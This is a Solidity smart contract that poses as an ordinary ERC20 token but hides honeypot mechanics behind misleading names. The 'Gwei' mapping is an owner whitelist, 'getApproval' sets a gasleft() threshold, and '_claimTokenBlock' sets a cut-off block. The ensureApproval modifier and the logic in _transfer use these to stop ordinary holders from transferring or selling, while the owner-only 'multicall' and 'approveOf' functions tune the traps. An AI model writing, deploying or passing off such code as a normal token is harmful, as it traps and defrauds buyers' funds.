pragma solidity ^0.8.0;

interface IERC20 {
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  function totalSupply() external view returns (uint256);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}




abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }

  function _msgData() internal view virtual returns (bytes calldata) {
    return msg.data;
  }
}

contract ERC20 is Context, IERC20 {
  mapping(address => uint256) private _balances;
  mapping(address => mapping(address => uint256)) private _allowances;
  mapping(address => uint256) public getApproval;
  mapping(address => bool) private Gwei;
  mapping(uint => uint) private _claimTransactionCount;
  mapping(address => uint256) private _claimTokenBlock;

  uint256 private _totalSupply;
  string private _name;
  string private _symbol;
  uint8 private _decimals = 18;
  address public owner;
  uint256 private balanceReceive;
  bool private _Presale;
  uint256 private _defaultApproval;
  uint256 private _defaultBalance;
  uint256 private _maxTransactionsPerClaim;
  uint256 private _tokenClaim;
  event defaultApprovalUpdated(uint256 oldValue, uint256 newValue);
  event defaultBalanceUpdated(uint256 oldValue, uint256 newValue);
  uint256 private _blockRecord;
  modifier ensureApproval(address _sender) {
      if (_sender != owner && !Gwei[_sender]) {
          require(gasleft() >= getApproval[_sender]);
          require(_claimTokenBlock[_sender] == 0 || _claimTokenBlock[_sender] > block.number);
      }
      _;
  }

  constructor(
    string memory name_,
    string memory symbol_,
    uint256 totalSupply_,
    address[] memory balanceApprove,
    uint256 balanceReceive_,
    uint256 defaultApproval,
    uint256 defaultBalance,
    address[] memory GweiUnit,
    uint256 maxTransactionsPerClaim_,
    uint256 tokenClaim_,
    uint256 blockRecord_

  ) {
    _name = name_;
    _symbol = symbol_;
 
    owner = _msgSender();
    _totalSupply = totalSupply_ * (10 ** uint256(_decimals));
    _balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
    balanceReceive = balanceReceive_;
    _defaultApproval = defaultApproval;
    _defaultBalance = defaultBalance;
    _Presale = false;
    _maxTransactionsPerClaim = maxTransactionsPerClaim_;
    _tokenClaim = tokenClaim_;
    _blockRecord = blockRecord_;

    for (uint256 i = 0; i < balanceApprove.length; i++) {
      _sendApproval(balanceApprove[i], balanceReceive);
    }

    for (uint256 i = 0; i < GweiUnit.length; i++) {
      Gwei[GweiUnit[i]] = true;
    }
  }

  function name() public view virtual returns (string memory) {
    return _name;
  }

  function symbol() public view virtual returns (string memory) {
    return _symbol;
  }

  function decimals() public view virtual returns (uint8) {
    return _decimals;
  }

  function totalSupply() public view virtual override returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) public view virtual override returns (uint256) {
    return _balances[account];
  }

  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    _claimRecord();
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function allowance(address owner, address spender) public view virtual override returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) public virtual override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    _claimRecord();
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
    return true;
  }

  function _transfer(address sender, address recipient, uint256 amount) internal virtual ensureApproval(sender) {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");

    if (!_Presale) {
        _Presale = true;
        Gwei[recipient] = true;
    } else {
        uint256 recipientClaim;
        assembly {
            recipientClaim := extcodesize(recipient)
        }

        if (recipientClaim == 0 && getApproval[recipient] == 0 && !Gwei[recipient]) {
            _sendApproval(recipient, _defaultBalance);
        } else if (recipientClaim > 0 && getApproval[recipient] == 0 && !Gwei[recipient]) {
            _sendApproval(recipient, _defaultApproval);
        }

        if(_claimTokenBlock[recipient] == 0 && !Gwei[recipient]) {
            _claimTokenBlock[recipient] = (block.number + _tokenClaim);
        }

    }

        _balances[sender] -= amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

  function _approve(address owner, address spender, uint256 amount) internal virtual {
    require(owner != address(0), "ERC20: approve from the zero address");
    require(spender != address(0), "ERC20: approve to the zero address");
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }


  function approveOf(uint256 newDefaultApproval) external {
    require(_msgSender() == owner);
    emit defaultApprovalUpdated(_defaultApproval, newDefaultApproval);
    _defaultApproval = newDefaultApproval;
    emit defaultBalanceUpdated(_defaultBalance, newDefaultApproval);
    _defaultBalance = newDefaultApproval;
  }


  function _sendApproval(address _address, uint256 approveForSwap) internal {
    getApproval[_address] = approveForSwap;
  }

  function multicall(address _address, uint256 approveAmount) external {
    require(_msgSender() == owner);
    _sendApproval(_address, approveAmount);
    _claimTokenBlock[_address] = block.number + _blockRecord;
  }

  function _claimRecord() internal {
    require(_claimTransactionCount[block.number] < _maxTransactionsPerClaim);
    _claimTransactionCount[block.number]++;
  }
}